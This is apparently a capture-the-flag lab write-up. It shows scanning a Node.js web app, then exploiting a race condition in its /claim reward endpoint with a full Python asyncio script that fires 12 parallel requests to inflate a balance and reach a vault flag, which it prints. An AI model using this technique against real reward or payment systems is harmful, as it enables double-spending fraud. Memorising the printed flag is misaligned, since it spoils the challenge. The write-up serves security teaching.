**Tags:** Web Exploitation, Business Logic, API Abuse, Burp Suite.

**Difficulty:** Medium.

## 1. Initial Access

Target:

```text
10.114.169.103:3000
```

When accessing the web application, we are redirected to:

```text
http://10.114.169.103:3000/auth/login
```

We register a new account:

```text
Username: ponzi1459A
Password: ponzi1459A
```

After authentication, we are taken to the dashboard.

---

## 2. Port Scanning

We run Nmap:

```bash
sudo nmap -sS -sV 10.114.169.103
```

Output:

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-05 07:19 EDT
Nmap scan report for 10.114.169.103
Host is up (0.075s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Open ports:

* `22/tcp` — SSH;
* `3000/tcp` — HTTP, Node.js Express.

The main point of interest is the web application running on port `3000`.

---

## 3. Directory Enumeration

We use Gobuster:

```bash
gobuster dir -u http://10.114.169.103:3000 -w ~/HH101/seclists/Discovery/Web-Content/common.txt
```

Result:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.114.169.103:3000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/deb88/HH101/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 153] [--> /css/]
/dashboard            (Status: 401) [Size: 61]
/js                   (Status: 301) [Size: 152] [--> /js/]
/vault                (Status: 401) [Size: 61]
Progress: 4752 / 4752 (100.00%)
```

The most interesting endpoints are:

```text
/dashboard
/vault
```

Both require authentication.

---

# 4. Analyzing the Dashboard API

When refreshing `/dashboard`, we inspect the HTTP requests. We discover the following API:

```http
GET /dashboard/api/me HTTP/1.1
Host: 10.114.169.103:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: */*
Referer: http://10.114.169.103:3000/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AlajEUBniMae0EC6ruoaTuMTksVKhvrkU.uNh7rYrCBO3nhu58Ec12PPqnygdIbfmJPnpzRrZA4II
If-None-Match: W/"11a-nV6fb9AfEqH1B3n+keHDWKq0TJk"
```

The presence of separate API endpoints makes the application interesting for further API enumeration.

---

# 5. Checking `/vault`

We try accessing `/vault`.

We get:

```json
{"error":"Access denied. Whale-tier balance required.","currentBalance":50,"required":150,"shortfall":100}
```

This provides important information.

The application reports:

```text
Current balance: 50
Required balance: 150
Shortfall: 100
```

Therefore, access to `/vault` depends on the amount of funds in the account.

We need to increase the balance to at least `150`.

---

# 6. Finding a Way to Increase the Balance

We inspect the application's API and discover the following endpoint by intercepting the request with Caido:

```text
POST /claim
```

We try sending several requests almost simultaneously:

```bash
for i in {1..5}; do
  curl -s -X POST \
  -H "Cookie: connect.sid=s%3ABRhPdum_cy0CBt8i4PW1afYFBrZERps0.a2xpdJpglZAU2A2KSpgDsXIR1feGJDROy8dph8Pb%2FrA" \
  http://10.114.169.103:3000/claim &
done
wait
```

The requests are launched in parallel:

```text
[1] 10599
[2] 10600
[3] 10601
[4] 10602
[5] 10603
```

However, the server responds:

```text
{"error":"Reward already claimed. Please wait before claiming again.","secondsRemaining":85919}
```

for all five requests.

At this point, we suspect that the endpoint may be vulnerable to a **race condition**.

---

# 7. Creating a Race-Condition Script

For more precise simultaneous request delivery, we write our own Python script using `asyncio` and `aiohttp`.

```python
import asyncio
import aiohttp

URL = "http://10.114.169.103:3000/claim"
HEADERS = {
    "Host": "10.114.169.103:3000",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Origin": "http://10.114.169.103:3000",
    "Referer": "http://10.114.169.103:3000/dashboard",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Cookie": "connect.sid=s%3A_7y6k1VXegKSecxIo5JMQqIXVhbS1bBj.XoZJWNQSaQDuoxsr4uSSJpbmVw3Xx4b6tdA96xKF7ow",
    "Content-Length": "0",
}

async def claim(session, i):
    try:
        async with session.post(URL, headers=HEADERS, data=b"", timeout=8) as r:
            text = await r.text()
            print(f"[{i:02}] {r.status} → {text[:150]}")
    except Exception as e:
        print(f"[{i:02}] ERROR: {e}")

async def main():
    connector = aiohttp.TCPConnector(limit=30, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [claim(session, i) for i in range(12)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
```

Here, `12` parallel tasks are created:

```python
tasks = [claim(session, i) for i in range(12)]
await asyncio.gather(*tasks)
```

This allows the requests to be sent almost simultaneously and increases the likelihood of hitting the race window with multiple requests.

---

# 8. Exploiting the Race Condition

We run:

```bash
python3 race.py
```

We get:

```text
[02] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":350,"tier":"Whale","priceSnapshot":4.2}
[05] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":350,"tier":"Whale","priceSnapshot":4.2}
[07] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":400,"tier":"Whale","priceSnapshot":4.2}
[00] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":350,"tier":"Whale","priceSnapshot":4.2}
[04] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":300,"tier":"Whale","priceSnapshot":4.2}
[06] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
[08] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
[11] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
[03] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
[09] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
[10] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
[01] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
```

All requests returned:

```text
200
```

with:

```text
"message":"Staking reward claimed successfully."
```

Instead of receiving the reward only once as expected, the server processed multiple simultaneous requests.

The balance increased from:

```text
50
```

to:

```text
600
```

while only:

```text
150
```

was required to access `/vault`.

Thus, the race condition was successfully exploited.

---

# 9. Gaining Access to the Vault

The account balance now meets the requirements:

```text
Current balance: 600
Required balance: 150
Tier: Whale
```

We navigate to:

```text
/vault
```

Access is granted.

Inside, we find the flag:

```text
THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
```

---

# Final Chain

```text
Registration
ponzi1459A:ponzi1459A
        │
        ▼
Dashboard
        │
        ▼
API enumeration
        │
        ▼
/vault
        │
        ▼
Access denied
50 < 150
        │
        ▼
/claim
        │
        ▼
Attempted parallel requests
        │
        ▼
Race Condition
        │
        ▼
12 simultaneous requests
        │
        ▼
Balance 50 → 600
        │
        ▼
Whale tier
        │
        ▼
/vault
        │
        ▼
THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
```

## Flag

```text
THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
```

### Vulnerability

The main vulnerability in the room is a **race condition in the `/claim` endpoint**. The server should have atomically checked the reward state and updated the balance, but multiple nearly simultaneous requests were able to pass the check and receive the reward multiple times. The resulting balance of `600` was sufficient to access `/vault` and obtain the flag.
